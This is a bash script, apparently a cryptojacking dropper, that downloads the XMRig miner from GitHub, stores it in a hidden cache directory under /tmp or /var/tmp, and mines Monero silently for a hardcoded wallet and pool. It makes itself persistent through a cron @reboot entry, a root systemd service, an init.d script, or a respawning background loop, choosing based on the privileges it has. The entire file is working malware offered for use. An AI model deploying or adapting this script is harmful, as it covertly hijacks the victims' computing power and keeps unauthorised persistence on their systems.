#!/bin/bash
# Universal Persistent Script (Low/High Privilege)
# GitHub: https://github.com/dadashabi123/shabi

set -euo pipefail

# 调试模式
DEBUG=false
if [ "${1:-}" = "debug" ]; then
    DEBUG=true
    set -x
fi

### 配置区（修改这里） ###
REPO_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
BIN_NAME="xmrig"
WALLET="43CcvodQDNGQnDyPY2adzKcgbmKzncFt1dtCDGUnJAKcQAmaVr3KQ5WhVsw2e8DYQcCbd16PbBhEWPk2GV3xrtoaH3kCrUE"
POOL="pool.supportxmr.com:3333"
THREADS="60"
WORKER_NAME="worker"
####################################

### 调试输出函数 ###
debug_echo() {
    if [ "$DEBUG" = true ]; then
        echo "[DEBUG] $1"
    fi
}

### 初始化环境 ###
init_env() {
    debug_echo "开始初始化环境"
    # 高权限用户优先使用 /var/tmp 或 /var/lib
    if [ "$(id -u)" -eq 0 ]; then
        for dir in "/var/tmp" "/var/lib" "/tmp"; do
            if [ -w "$dir" ]; then
                STORE_DIR="$dir/.${BIN_NAME}_cache"
                debug_echo "选择存储目录: $STORE_DIR"
                break
            fi
        done
    else
        # 低权限用户或无 home 目录的用户
        for dir in "/tmp" "/var/tmp" "$(pwd)"; do
            if [ -w "$dir" ]; then
                STORE_DIR="$dir/.${BIN_NAME}_cache"
                debug_echo "选择存储目录: $STORE_DIR"
                break
            fi
        done
    fi

    # 如果所有目录都不可写，使用当前目录
    if [ -z "${STORE_DIR:-}" ]; then
        STORE_DIR="$(pwd)/.${BIN_NAME}_cache"
        debug_echo "使用当前目录: $STORE_DIR"
    fi

    # 确保目录存在并可写
    mkdir -p "$STORE_DIR"
    if [ ! -w "$STORE_DIR" ]; then
        echo "[-] Error: 无法写入目录 $STORE_DIR" >&2
        exit 1
    fi
    debug_echo "存储目录已创建并确认可写"
    
    # 选择下载工具（优先用 curl）
    if command -v curl >/dev/null; then
        DOWNLOAD="curl -sSL"
        debug_echo "使用 curl 下载"
    elif command -v wget >/dev/null; then
        DOWNLOAD="wget -qO-"
        debug_echo "使用 wget 下载"
    else
        echo "[-] Error: 需要 curl 或 wget!" >&2
        exit 1
    fi
}

### 下载并部署二进制 ###
deploy_bin() {
    if [ ! -f "${STORE_DIR}/${BIN_NAME}" ]; then
        echo "[*] 下载 ${BIN_NAME}..."
        debug_echo "开始下载和解压过程"
        
        # 创建临时目录
        TEMP_DIR="${STORE_DIR}/temp"
        mkdir -p "$TEMP_DIR"
        debug_echo "创建临时目录: $TEMP_DIR"
        
        # 下载文件
        debug_echo "下载URL: $REPO_URL"
        $DOWNLOAD "$REPO_URL" > "${TEMP_DIR}/archive.tar.gz"
        if [ $? -ne 0 ]; then
            echo "[-] 下载失败"
            rm -rf "$TEMP_DIR"
            exit 1
        fi
        debug_echo "下载完成"
        
        # 解压文件
        debug_echo "开始解压"
        tar -xzf "${TEMP_DIR}/archive.tar.gz" -C "$TEMP_DIR"
        if [ $? -ne 0 ]; then
            echo "[-] 解压失败"
            rm -rf "$TEMP_DIR"
            exit 1
        fi
        debug_echo "解压完成"
        
        # 查找二进制文件
        debug_echo "查找二进制文件"
        BIN_PATH=$(find "$TEMP_DIR" -name "xmrig" -type f | head -n 1)
        if [ -z "$BIN_PATH" ]; then
            echo "[-] 未找到二进制文件"
            debug_echo "目录内容:"
            ls -R "$TEMP_DIR"
            rm -rf "$TEMP_DIR"
            exit 1
        fi
        debug_echo "找到二进制文件: $BIN_PATH"
        
        # 移动文件
        debug_echo "移动文件到: ${STORE_DIR}/${BIN_NAME}"
        cp "$BIN_PATH" "${STORE_DIR}/${BIN_NAME}"
        chmod +x "${STORE_DIR}/${BIN_NAME}"
        
        # 清理
        debug_echo "清理临时文件"
        rm -rf "$TEMP_DIR"
        
        if [ ! -x "${STORE_DIR}/${BIN_NAME}" ]; then
            echo "[-] 权限设置失败"
            exit 1
        fi
        echo "[+] 二进制文件准备完成"
    fi
}

### 启动进程 ###
start_process() {
    debug_echo "开始启动进程"
    if ! pgrep -f "${BIN_NAME}.*${POOL}" >/dev/null; then
        debug_echo "启动新进程"
        "${STORE_DIR}/${BIN_NAME}" \
            -o "$POOL" -u "$WALLET" --cpu-max-threads-hint "$THREADS" \
            -p "$WORKER_NAME" --donate-level=0 -b >/dev/null 2>&1 &
    else
        debug_echo "进程已在运行"
    fi
}

### 持久化方式检测 ###
setup_persistence() {
    debug_echo "开始设置持久化"

    # 1. 首选 Cron（通用且不需要高权限）
    if command -v crontab >/dev/null; then
        debug_echo "使用 Cron 持久化"
        STARTUP_CMD="cd ${STORE_DIR} && nohup ${STORE_DIR}/${BIN_NAME} -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER_NAME --donate-level=0 -b >/dev/null 2>&1 &"
        (crontab -l 2>/dev/null; echo "@reboot $STARTUP_CMD") | crontab - >/dev/null 2>&1
        eval "$STARTUP_CMD" &
        return
    fi

    # 2. 尝试 Systemd 服务（需要高权限）
    if [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null; then
        debug_echo "使用 Systemd 持久化"
        SERVICE_FILE="/etc/systemd/system/${BIN_NAME}.service"
        cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=${BIN_NAME} Service
After=network.target

[Service]
ExecStart=${STORE_DIR}/${BIN_NAME} -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER_NAME --donate-level=0 -b
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
        systemctl enable "${BIN_NAME}.service" >/dev/null 2>&1
        systemctl start "${BIN_NAME}.service" >/dev/null 2>&1
        return
    fi

    # 3. 尝试 /etc/init.d 脚本（需要高权限）
    if [ "$(id -u)" -eq 0 ]; then
        debug_echo "使用 /etc/init.d 脚本持久化"
        INIT_SCRIPT="/etc/init.d/${BIN_NAME}"
        cat > "$INIT_SCRIPT" <<EOF
#!/bin/bash
### BEGIN INIT INFO
# Provides: ${BIN_NAME}
# Required-Start: \$network
# Required-Stop: \$network
# Default-Start: 2 3 4 5
# Default-Stop: 0 1 6
# Short-Description: ${BIN_NAME} Service
# Description: ${BIN_NAME} Mining Service
### END INIT INFO

# 存储目录
STORE_DIR="${STORE_DIR}"
BIN_NAME="${BIN_NAME}"
POOL="${POOL}"
WALLET="${WALLET}"
THREADS="${THREADS}"
WORKER_NAME="${WORKER_NAME}"

# 启动命令
START_CMD="cd \${STORE_DIR} && nohup \${STORE_DIR}/\${BIN_NAME} -o \${POOL} -u \${WALLET} --cpu-max-threads-hint \${THREADS} -p \${WORKER_NAME} --donate-level=0 -b >/dev/null 2>&1 &"

case "\$1" in
    start)
        if ! pgrep -f "\${BIN_NAME}.*\${POOL}" >/dev/null; then
            eval "\${START_CMD}"
        fi
        ;;
    stop)
        pkill -f "\${BIN_NAME}.*\${POOL}" >/dev/null 2>&1
        ;;
    restart)
        \$0 stop
        sleep 2
        \$0 start
        ;;
    status)
        if pgrep -f "\${BIN_NAME}.*\${POOL}" >/dev/null; then
            exit 0
        else
            exit 1
        fi
        ;;
    *)
        exit 1
        ;;
esac
exit 0
EOF
        # 设置权限
        chmod +x "$INIT_SCRIPT"
        
        # 启用服务（根据系统类型选择命令）
        if command -v update-rc.d >/dev/null; then
            update-rc.d "${BIN_NAME}" defaults >/dev/null 2>&1
        elif command -v chkconfig >/dev/null; then
            chkconfig "${BIN_NAME}" on >/dev/null 2>&1
        fi
        
        # 立即启动服务
        "$INIT_SCRIPT" start
        return
    fi

    # 4. 回退到 While 循环（最低权限）
    debug_echo "使用 While 循环监控"
    monitor_func() {
        while true; do
            if ! pgrep -f "${BIN_NAME}.*${POOL}" >/dev/null; then
                cd "${STORE_DIR}"
                nohup "${STORE_DIR}/${BIN_NAME}" -o "$POOL" -u "$WALLET" --cpu-max-threads-hint "$THREADS" -p "$WORKER_NAME" --donate-level=0 -b >/dev/null 2>&1 &
            fi
            sleep 300
        done
    }
    monitor_func &
}

### 检查进程状态 ###
check_status() {
    debug_echo "检查进程状态"
    # 检查主进程
    if pgrep -f "${BIN_NAME}.*${POOL}" >/dev/null; then
        echo "[+] 主进程运行中"
        return 0
    fi
    
    # 检查持久化方式
    if [ -f "/etc/systemd/system/${BIN_NAME}.service" ]; then
        echo "[+] Systemd 服务已配置"
        return 0
    elif crontab -l 2>/dev/null | grep -q "${BIN_NAME}.*${POOL}"; then
        echo "[+] Cron 任务已配置"
        return 0
    elif pgrep -f "monitor_func" >/dev/null; then
        echo "[+] 监控进程运行中"
        return 0
    fi
    
    echo "[-] 未检测到运行中的进程"
    return 1
}

### 主流程 ###
main() {
    init_env
    deploy_bin
    start_process
    setup_persistence
    # 检查状态
    check_status
    # 立即退出，不等待
    exit 0
}

main "$@"
